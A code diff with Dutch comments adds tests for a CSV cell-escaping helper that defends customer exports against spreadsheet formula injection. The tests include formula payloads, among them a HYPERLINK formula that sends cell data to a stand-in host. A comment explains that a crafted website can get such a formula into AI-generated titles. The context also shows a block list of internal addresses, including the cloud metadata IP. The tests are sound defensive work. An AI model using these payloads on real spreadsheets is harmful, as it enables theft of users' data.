@@ -40,6 +40,7 @@ import { buildChangeBlock, isWorthEmailing } from "@/lib/pipeline/period-change-
 import type { PeriodChange } from "@/lib/pipeline/period-change-format";
 import { domainOf } from "@/lib/offsite/domain";
 import { checkUrlFormat, isInternalHostname } from "@/lib/url";
+import { csvCell } from "@/lib/csv";
 import { sanitizeForPostgres, hasUnstorableChars } from "@/lib/pg-text";
 import { countOpenPeriodicMeasurements } from "@/lib/jobs/pending";
 import { formatEvidenceDossier, excerpt } from "@/lib/pipeline/evidence-format";
@@ -961,6 +962,35 @@ group("webadres controleren", () => {
  *
  * Gaat hier ooit een test rood, verwijder hem dan NIET: dan is de zeef stuk.
  */
+group("CSV-cellen zijn veilig voor Excel (antihack.md M4)", () => {
+  // Formule-injectie. De titel van een contentstuk komt uit het model, dat
+  // schrijft op basis van tekst van een website die wij niet beheren. Een
+  // geprepareerde site kan zo een formule in de export van de klant krijgen.
+  ok("gelijkteken wordt onschadelijk", csvCell("=1+1") === "'=1+1");
+  ok("plus wordt onschadelijk", csvCell("+1") === "'+1");
+  ok("min wordt onschadelijk", csvCell("-1") === "'-1");
+  ok("apenstaartje wordt onschadelijk", csvCell("@SUM(A1)") === "'@SUM(A1)");
+  ok("tab wordt onschadelijk", csvCell("\tiets") === "'\tiets");
+  ok(
+    "een HYPERLINK die data wegstuurt wordt tekst",
+    csvCell('=HYPERLINK("http://kwaad/?d="&A1,"klik")').includes("'="),
+  );
+
+  // Het aanhalen zelf moet blijven werken zoals het werkte.
+  ok("gewone tekst blijft ongemoeid", csvCell("Fietsen in Utrecht") === "Fietsen in Utrecht");
+  ok("puntkomma wordt aangehaald", csvCell("a;b") === '"a;b"');
+  ok("aanhalingsteken wordt verdubbeld", csvCell('zeg "hoi"') === '"zeg ""hoi"""');
+  ok("regeleinde wordt aangehaald", csvCell("regel1\nregel2") === '"regel1\nregel2"');
+  ok("null wordt leeg", csvCell(null) === "");
+  ok("een getal blijft een getal", csvCell(42) === "42");
+
+  // ⚠️ Een negatief getal is een echte waarde, maar Excel ziet er een formule
+  // in. Onschadelijk maken wint: een apostrof in een cel is een schoonheidsfout,
+  // een uitgevoerde cel is een lek. Alle getalkolommen in de export zijn
+  // tellingen en verschillen, en die zijn nooit negatief behalve een daling.
+  ok("negatief getal krijgt de apostrof", csvCell(-3) === "'-3");
+});
+
 group("interne adressen worden geweerd (antihack.md K1)", () => {
   const intern = [
     "169.254.169.254", // metadata-adres van de cloud
